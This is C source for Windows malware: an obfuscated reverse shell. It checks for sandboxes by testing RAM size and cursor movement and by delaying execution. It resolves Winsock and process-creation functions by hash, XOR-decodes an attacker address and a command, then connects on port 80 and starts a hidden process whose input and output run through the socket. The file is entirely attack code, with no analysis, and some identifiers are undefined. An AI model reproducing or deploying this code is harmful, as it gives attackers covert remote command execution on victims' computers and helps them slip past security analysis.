#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#pragma comment(lib, "w2_32")
#include <stdio.h>
#include <string.h>
#include <unistd.h>


char sqlksaqs[]="06362228112";
char assooks[]="S[W6";
char wwwww[]="lsqpsqpsw";

char pppppp[]="]JC^BGH]FBBEGs`!«";

void KKKKKKKKKKKKKKKKKKKKKKKKKKKKKK(char * d, size_t d_len, char * k, size_t k_len) {
    int Ywskjaa;
    
    Ywskjaa = 0;
    for (int i = 0; i < d_len; i++) {
        if (Ywskjaa == k_len - 1) Ywskjaa = 0;
        d[i] = d[i] ^ k[Ywskjaa];
        Ywskjaa++;
    }
}

BOOL mc() {
	MEMORYSTATUSEX sx;
	sx.dwLength = sizeof(sx);
	GlobalMemoryStatusEx(&sx);
	if (sx.ullTotalPhys / 1024 / 1024 / 1024 >= 2.00) {
		return TRUE;
	}
	else {
		return FALSE;
	}

}

int ma() {
    POINT p1, p2;

    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);

    if ((p1.x == p2.x) && (p1.y == p2.y))
       
        return TRUE;
    else
        return FALSE;
}

unsigned int  HHHHHHHHHHHHHHHHHHHHH(const char* str) {
    uint64_t hh = 14695981039346656037u; 
    const uint64_t FNV_prime = 1099511628211u;
    while (*str != '\0') {
        hh ^=(uint64_t)(*str);
        hh *= FNV_prime;
        str++;
    }
    return hh;
}
typedef int(WSAAPI* UUWAASSS)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* SAASSIII)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* OWWW)(const char *cp);
typedef u_short(WSAAPI* NLLK)(u_short hostshort);
typedef int(WSAAPI* MUG)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* WITSUP)(SOCKET s);
typedef int(WSAAPI* MUGU)(void);
static LPVOID CHECkCHECK(HMODULE h, DWORD mh) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (HHHHHHHHHHHHHHHHHHHHH(pFuncName) == mh) {
    
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return 0;;
}
struct sockaddr_in POTATO;
STARTUPINFO BREAD;
PROCESS_INFORMATION HARIRA;
WSADATA BANANA;
SOCKET TOMATO;


typedef BOOL (WINAPI *pKSIKUT)(
    LPCSTR    lpApplicationName,
    LPSTR     lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL      bInheritHandles,
    DWORD     dwCreationFlags,
    LPVOID    lpEnvironment,
    LPCSTR    lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	
	sleep(15);
	if (mc()==TRUE && ma()==TRUE){

   
  
  LPVOID DRDRGFF1 = CHECkCHECK(weird, -2059735159);
  LPVOID DRDRGFF2 = CHECkCHECK(notweird, 1341779093);
  LPVOID DRDRGFF3 = CHECkCHECK(notweird, -1052386541);
  LPVOID DRDRGFF4 = CHECkCHECK(notweird, 170119014);
  LPVOID DRDRGFF5 = CHECkCHECK(notweird, -27676833);
  LPVOID DRDRGFF6 = CHECkCHECK(notweird, -247297320);
  LPVOID DRDRGFF7 = CHECkCHECK(notweird,  -92414494);
  LPVOID DRDRGFF8 = CHECkCHECK(notweird, -742078462);
  
  
UUWAASSS UUWAASSSMM = (UUWAASSS) DRDRGFF5;
SAASSIII mSAASSIII = (SAASSIII) DRDRGFF4;
OWWW mOWWW = (OWWW) DRDRGFF3;
NLLK mNLLK = (NLLK) DRDRGFF2;
MUG mMUG = (MUG) DRDRGFF6;
WITSUP mWITSUP = (WITSUP) DRDRGFF7;
MUGU mMUGU = (MUGU) DRDRGFF8; 
  
  
    
    
KKKKKKKKKKKKKKKKKKKKKKKKKKKKKK(pppppp,sizeof pppppp, wwwww,sizeof wwwww);
  
  const char *onwa = pppppp;  
  short bbbbbbbbb = 80 ; 
 
  UUWAASSSMM(MAKEWORD(2, 2), &BANANA);
  
  TOMATO = mSAASSIII(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
  POTATO.sin_family = AF_INET;
  POTATO.sin_port = mNLLK(bbbbbbbbb);
  POTATO.sin_addr.s_addr = mOWWW(onwa);
 
  mMUG(TOMATO, (SOCKADDR*)&POTATO, sizeof(POTATO), NULL, NULL, NULL, NULL);
  memset(&BREAD, 0, sizeof(BREAD));
  BREAD.cb = sizeof(BREAD);
  BREAD.dwFlags = STARTF_USESTDHANDLES;
  BREAD.hStdInput = BREAD.hStdOutput = BREAD.hStdError = (HANDLE) TOMATO;
  

  KKKKKKKKKKKKKKKKKKKKKKKKKKKKKK(assooks,sizeof assooks, sqlksaqs,sizeof sqlksaqs);
  
  pKSIKUT pKSIKUT2=(pKSIKUT)DRDRGFF1;
 
  pKSIKUT2(NULL,assooks , NULL, NULL, TRUE, CREATE_NO_WINDOW , NULL, NULL, &BREAD, &HARIRA);

}
else{
  
  exit(0);
}


}
